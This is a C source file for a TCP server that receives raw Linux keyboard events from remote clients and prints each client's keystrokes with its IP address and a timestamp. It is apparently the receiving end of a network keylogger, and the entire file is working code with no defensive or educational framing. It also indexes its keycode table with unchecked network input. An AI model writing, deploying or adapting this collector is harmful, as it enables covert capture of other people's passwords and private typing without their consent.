/* Developed by Fabio Cinicolo */

#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/poll.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <errno.h>
#include <linux/input.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <arpa/inet.h>

#define RED "\x1B[31m"
#define YEL "\x1B[33m"
#define BLU "\x1B[34m"
#define GRN "\x1B[32m"
#define RESET "\x1B[0m"

#define SERVER_PORT 12345

#define MAX_KEYBOARD_EVENTS 10

#define TRUE 1
#define FALSE 0

char *keycodes[249] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M", "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER", "KPEQUAL", "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA", "HANGEUL", "HANGUEL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA",
                       "COMPOSE", "STOP", "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT", "HELP", "MENU", "CALC", "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE", "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS", "COFFEE", "SCREENLOCK", "ROTATE_DISPLAY",
                       "DIRECTION", "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD", "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD", "RECORD", "REWIND", "PHONE", "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT", "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN", "NEW", "REDO", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21", "F22", "F23", "F24", "PLAYCD", "PAUSECD", "PROG3", "PROG4", "ALL_APPLICATIONS", "DASHBOARD", "SUSPEND", "CLOSE", "PLAY", "FASTFORWARD", "BASSBOOST", "PRINT", "HP", "CAMERA", "SOUND", "QUESTION", "EMAIL", "CHAT", "SEARCH", "CONNECT", "FINANCE", "SPORT", "SHOP", "ALTERASE", "CANCEL", "BRIGHTNESSDOWN", "BRIGHTNESSUP", "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP", "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH", "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE", "BRIGHTNESS_AUTO", "BRIGHTNESS_ZERO", "DISPLAY_OFF", "WWAN", "WIMAX", "RFKILL", "MICMUTE"};

int main(int argc, char **argv)
{
  int on = 1;
  int listen_sd = -1, new_sd = -1;
  int end_server = FALSE, compress_array = FALSE;
  int close_conn;
  struct sockaddr_in server_addr, client_addr;
  int timeout;
  struct pollfd fds[200];
  int nfds = 1;
  struct input_event kbd_events[MAX_KEYBOARD_EVENTS];
  size_t event_size = sizeof(struct input_event);
  int descriptors_ready;
  char *client_addresses[200];

  /*Create listening tcp socket*/
  if ((listen_sd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    perror("socket()"), exit(EXIT_FAILURE);

   /* Set listening socket in non-blocking mode */
  if (ioctl(listen_sd, FIONBIO, (char *)&on) < 0)
  {
    perror("ioctl()");
    close(listen_sd);
    exit(EXIT_FAILURE);
  }

  server_addr.sin_family = PF_INET;
  server_addr.sin_port = htons(SERVER_PORT);
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  memset(server_addr.sin_zero, 0, 8);

  /* Bind socket */
  if (bind(listen_sd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
  {
    perror("bind()");
    close(listen_sd);
    exit(EXIT_FAILURE);
  }

  /* listen_sd is a passive socket, it will listen for incoming connections */
  if (listen(listen_sd, 32) < 0)
  {
    perror("listen() failed");
    close(listen_sd);
    exit(EXIT_FAILURE);
  }

  /* Initialize the pollfd structure */
  memset(fds, 0, sizeof(fds));

  /* Set up the initial listening socket */
  fds[0].fd = listen_sd;
  fds[0].events = POLLIN;

  /* Set up infinite poll timeout */
  timeout = -1;

  printf(RED "Server is running..\n\n" RESET);
  /* Accept new connections or read from ready sockets */
  do
  {
    if ((descriptors_ready = poll(fds, nfds, timeout)) < 0)
    {
      perror("poll()");
      break;
    }

    /*One or more descriptors are ready, we have to find and operate on them*/
    for (int i = 0; i < nfds && descriptors_ready > 0; i++)
    {
      /*If current file descriptor is not ready we skip it*/
      if (fds[i].revents == 0)
        continue;

      /* If revents is not POLLIN, it's an unexpected result, log and end the server. */
      if (fds[i].revents != POLLIN)
      {
        fprintf(stderr, "Error! revents = %d\n", fds[i].revents);
        end_server = TRUE;
        break;
      }
      if (fds[i].fd == listen_sd)
      {
        descriptors_ready--;

        /* Listening socket is readable, we accept every incoming connection until
           accept() fails with EWOULDBLOCK */
        do
        {
          socklen_t client_addr_length = sizeof(client_addr);
          if ((new_sd = accept(listen_sd, (struct sockaddr *)&client_addr, &client_addr_length)) < 0)
          {
            if (errno != EWOULDBLOCK)
            {
              perror("accept()");
              end_server = TRUE;
            }
            break;
          }

          // Put the socket in non-blocking mode
          if (fcntl(new_sd, F_SETFL, fcntl(new_sd, F_GETFL) | O_NONBLOCK) < 0)
            perror("fcntl"), exit(EXIT_FAILURE);

          /* Add the new incoming connection to the pollfd struct */
          char *client_ip = inet_ntoa(client_addr.sin_addr);
          fds[nfds].fd = new_sd;
          fds[nfds].events = POLLIN;
          client_addresses[nfds] = malloc(strlen(client_ip) + 1);
          strncpy(client_addresses[nfds], client_ip, strlen(client_ip) + 1);
          printf("\nNew incoming connection " BLU "IP: %s - " GRN "fd: %d\n\n" RESET, client_ip, fds[nfds].fd);
          nfds++;

        } while (new_sd != -1);
      }

      /*Accepted socket is readable*/

      else
      {
        descriptors_ready--;
        close_conn = FALSE;
        do
        {

          ssize_t bytes_read;
          if ((bytes_read = recv(fds[i].fd, kbd_events, MAX_KEYBOARD_EVENTS * event_size, 0)) < 0)
          {
            if (errno != EWOULDBLOCK)
            {
              perror("recv()");
              close_conn = TRUE;
            }
            break;
          }

          /* Reading keyboard press events */
          for (ssize_t j = 0; j < bytes_read / event_size; j++)
            printf(BLU "IP: %s - " YEL "Time: %ld - " RED "Key: %s\n" RESET, client_addresses[i], kbd_events[j].time.tv_sec, keycodes[kbd_events[j].code]);

          /*If client closed connection*/
          if (!bytes_read)
          {

            close_conn = TRUE;
            break;
          }

        } while (TRUE);

        /* If the close_conn flag was turned on, we need       */
        /* to clean up this active connection. This            */
        /* clean up process includes removing the              */
        /* descriptor.                                         */
        if (close_conn)
        {
          printf("Closing connection with client. " BLU "IP: %s - " GRN "fd: %d\n\n" RESET, client_addresses[i], fds[i].fd);
          close(fds[i].fd);
          free(client_addresses[i]);
          fds[i].fd = -1;
          compress_array = TRUE;
        }
      }
    }

    /* If the compress_array flag was turned on, we need       */
    /* to squeeze together the array and decrement the number  */
    /* of file descriptors. We do not need to move back the    */
    /* events and revents fields because the events will always*/
    /* be POLLIN in this case, and revents is output.          */
    if (compress_array)
    {
      compress_array = FALSE;
      for (int i = 0; i < nfds; i++)
      {
        if (fds[i].fd == -1)
        {
          for (int j = i; j < nfds - 1; j++)
          {
            fds[j].fd = fds[j + 1].fd;
            client_addresses[j] = client_addresses[j + 1];
          }
          i--;
          nfds--;
        }
      }
    }

  } while (end_server == FALSE);

  /* Clean up all of the sockets that are open */
  for (int i = 0; i < nfds; i++)
  {
    if (fds[i].fd >= 0)
    {
      close(fds[i].fd);
      free(client_addresses[i]);
    }
  }

  exit(EXIT_SUCCESS);
}
